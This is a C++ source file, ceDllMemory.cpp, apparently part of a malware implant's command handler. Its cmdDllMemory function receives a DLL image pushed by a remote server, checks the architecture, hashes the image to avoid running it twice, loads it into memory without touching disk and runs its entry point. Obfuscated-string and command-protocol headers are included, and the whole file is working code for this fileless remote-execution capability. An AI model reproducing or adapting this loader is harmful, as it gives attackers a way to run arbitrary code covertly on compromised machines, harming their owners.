/*
	ceDllMemory.cpp
*/

#include <Windows.h>

#include "..\inc\dbg.h"
#include "..\inc\mem.h"					
#include "..\inc\CryptoStrings.h"		
#include "..\inc\MyStreams.h"
#include "..\inc\HashedStrings.h"
#include "..\inc\DataCallbackManager.h"
#include "..\inc\PELoader.h"
#include "..\shared\CommStructures.h"

#include "ceGeneric.h"

#include "ceDllMemory.h"


DLLMEM_CONTEXT gdm_Context;	// globals for this module, inited via _dmCheckInitContext()

VOID _dmCheckInitContext(DLLMEM_CONTEXT *Context)
{
	if (Context->bInited) { return;  }

	DbgPrint("initializing context");

	InitializeCriticalSection(&Context->csHashesAccess);
	msInitStream(&Context->mHashesStream);

}

VOID _dmCsIn() { EnterCriticalSection(&gdm_Context.csHashesAccess); }
VOID _dmCsOut() { LeaveCriticalSection(&gdm_Context.csHashesAccess); }

// adds hash to global context, with cs lock
VOID _dmAddHash(UINT64 i64Hash)
{
	_dmCsIn();
	gdm_Context.mHashesStream.msWriteStream(&gdm_Context.mHashesStream, &i64Hash, sizeof(UINT64));
	_dmCsOut();
}



/*
	Checks hash of binary against module global's stream to ensure no such module is running already
*/
BOOL isMemRunningAlready(LPVOID pPE, DWORD dwPELen)
{
	BOOL bRes = FALSE;	// by default
	UINT64 i64ModuleHash;	// hash of a module to be checked

	UINT64 *pi64HashList;	// ptr to all hashes stored
	DWORD iHashCount;	// amount of hashes stored

	// calc hash
	i64ModuleHash = HashBin(pPE, dwPELen);

	// check if global context already inited
	_dmCheckInitContext(&gdm_Context);

	// scan for hashes
	_dmCsIn();
	do { // not a loop
		

		if (gdm_Context.mHashesStream.lDataLen) {

			pi64HashList = (UINT64 *)gdm_Context.mHashesStream.pData;
			iHashCount = gdm_Context.mHashesStream.lDataLen / sizeof(UINT64);
			DbgPrint("stream contains %u hashes to be checked", iHashCount);

			while (iHashCount) {

				if (*pi64HashList == i64ModuleHash) { DbgPrint("NOTE: found matching hash"); bRes = TRUE; break; }

				pi64HashList++;
				iHashCount--;

			} // while more hashes

		} // stream len > 0

		// if got here -> possibly no hash exists, need to add it
		if (!bRes) { _dmAddHash(i64ModuleHash); }

	} while (FALSE);	// not a loop
	_dmCsOut();

	// func result
	return bRes;
}

// arch-specific
BOOL cmdDllMemory(DISPATCHER_CALLBACK_PARAMS *dcp)
{
	SERVER_COMMAND *sCommand = (SERVER_COMMAND *)dcp->pInBuffer;	// command + payload ptr

	// PELoad()
	LPVOID pImage;
	SIZE_T lImageLen;
	EntryPoint EP;

	DbgPrint("entered");

	do {	// not a loop

		// check arch
		if (sCommand->bTargetArch != SCTA_BUILD_ARCH) { cmFormAnswer(dcp, CER_ERR_PLATFORM_MISMATCH, NULL, 0); DbgPrint("ERR: platform mismatch: current=%u cmd_target=%u", SCTA_BUILD_ARCH, sCommand->bTargetArch); break; }

		// basic check
		if (!sCommand->dwPayloadSize) { cmFormAnswerSpecificErr(dcp, ERR_EMPTY_FILE, 0); DbgPrint("ERR: empty file passed"); break; }

		// calc hash of image to make sure it is not being running already
		if (isMemRunningAlready((LPVOID)((SIZE_T)sCommand + sizeof(SERVER_COMMAND)), sCommand->dwPayloadSize)) { cmFormAnswerSpecificErr(dcp, ERR_ALREADY_RUNNING, 0); DbgPrint("ERR: specified module is already running"); break; }

		// load pe
		if (!PELoad((LPVOID)((SIZE_T)sCommand + sizeof(SERVER_COMMAND)), &pImage, &lImageLen, (LPVOID *)&EP)) { cmFormAnswerSpecificErr(dcp, ERR_PE_LOAD_FAILED, 0); DbgPrint("ERR: specified module is already running"); break; }

		// run it's entrypoint
		__try {

			if (!EP(NULL, DLL_PROCESS_ATTACH, NULL)) { cmFormAnswerSpecificErr(dcp, ERR_DLLENTRY_RETURNED_FALSE, 0); DbgPrint("ERR: DllEntry returned FALSE"); break; }

		} __except (1) { cmFormAnswerSpecificErr(dcp, ERR_DLLENTRY_EXCEPTION, 0); DbgPrint("ERR: DllEntry exception catched"); break; }

		// all done ok
		DbgPrint("run OK");
		cmFormAnswer(dcp, CER_OK, NULL, 0);

	} while (FALSE);	// not a loop

	// should always return TRUE in order to stop sending this cmd to other callbacks
	return TRUE;
}